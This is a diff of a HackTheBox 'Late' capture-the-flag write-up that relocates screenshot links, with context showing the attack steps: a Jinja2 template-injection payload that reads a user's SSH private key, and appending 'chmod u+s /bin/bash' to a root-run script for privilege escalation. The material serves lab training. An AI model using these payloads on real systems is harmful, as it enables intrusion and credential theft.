@@ -138,9 +138,9 @@ curl -i http://image.late.htb/
 
 The vhost provides **OCR functionality** (uploading an image generates a `results.txt` file).
 
-![imagen_example](imagen_example.png)
+![imagen_example](screenshots/imagen_example.png)
 
-![resukt_example](resukt_example.png)
+![resukt_example](screenshots/resukt_example.png)
 
 ---
 ## 3. Foothold
@@ -154,11 +154,11 @@ We test for SSTI by uploading an image containing `{{7*7}}`:
 true
 ```
 
-![image_49](image_49.png)
+![image_49](screenshots/image_49.png)
 
 Result:
 
-![result_49](result_49.png)
+![result_49](screenshots/result_49.png)
 
 The output returns `49`, confirming **SSTI in Jinja2**.
 
@@ -179,7 +179,7 @@ Filter valid shells:
 cat etc_passwd.txt | grep "sh$"
 ```
 
-![etc_passwd_sh](etc_passwd_sh.png)
+![etc_passwd_sh](screenshots/etc_passwd_sh.png)
 
 Users identified:
 - `root`
@@ -194,7 +194,7 @@ We attempt to read the userâ€™s private key:
 {{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
 ```
 
-![image_id_rsa](image_id_rsa.png)
+![image_id_rsa](screenshots/image_id_rsa.png)
 
 Result file:
 
@@ -202,7 +202,7 @@ Result file:
 
 We clean the key to ensure a valid PEM format:
 
-![id_rsa_clean](id_rsa_clean.png)
+![id_rsa_clean](screenshots/id_rsa_clean.png)
 
 ### 3.4 SSH session and user flag
 
@@ -227,7 +227,7 @@ We search for files owned by `svc_acc` outside common directories:
 find / -user svc_acc 2>/dev/null | grep -vE "proc|run|var|sys|home"
 ```
 
-![proc_svc_acc](proc_svc_acc.png)
+![proc_svc_acc](screenshots/proc_svc_acc.png)
 
 We find:
 
@@ -245,7 +245,7 @@ ls -l /usr/local/sbin/ssh-alert.sh
 cat /usr/local/sbin/ssh-alert.sh
 ```
 
-![svc_acc_ssh_alert](svc_acc_ssh_alert.png)
+![svc_acc_ssh_alert](screenshots/svc_acc_ssh_alert.png)
 
 This script is executed as **root** when someone logs in via SSH.
 
@@ -259,8 +259,8 @@ chmod +x pspy64
 ./pspy64
 ```
 
-![pspy](pspy.png)
-![pspy_running](pspy_running.png)
+![pspy](screenshots/pspy.png)
+![pspy_running](screenshots/pspy_running.png)
 
 When logging in again, we confirm the script is executed by **root**.
 
@@ -269,7 +269,7 @@ When logging in again, we confirm the script is executed by **root**.
 
 Attempts to edit fail:
 
-![ssh_alert_edit_fail](ssh_alert_edit_fail.png)
+![ssh_alert_edit_fail](screenshots/ssh_alert_edit_fail.png)
 
 So we inspect attributes:
 
@@ -277,7 +277,7 @@ So we inspect attributes:
 lsattr /usr/local/sbin/ssh-alert.sh 
 ```
 
-![ssh_alert_priv](ssh_alert_priv.png)
+![ssh_alert_priv](screenshots/ssh_alert_priv.png)
 
 The file has the **append-only (`a`)** attribute.  
 We cannot overwrite it, but we can append malicious commands.
@@ -289,7 +289,7 @@ echo "chmod u+s /bin/bash" > bash.txt
 cat bash.txt >> /usr/local/sbin/ssh-alert.sh
 ```
 
-![ssh_alerts_command_injection](ssh_alerts_command_injection.png)
+![ssh_alerts_command_injection](screenshots/ssh_alerts_command_injection.png)
 
 After logging in again, `/bin/bash` has the SUID bit set.  
 We escalate:
@@ -299,7 +299,7 @@ ls -l /bin/bash
 bash -p
 ```
 
-![ssh_alert_bash](ssh_alert_bash.png)
+![ssh_alert_bash](screenshots/ssh_alert_bash.png)
 
 ðŸ **Root flag obtained**
 
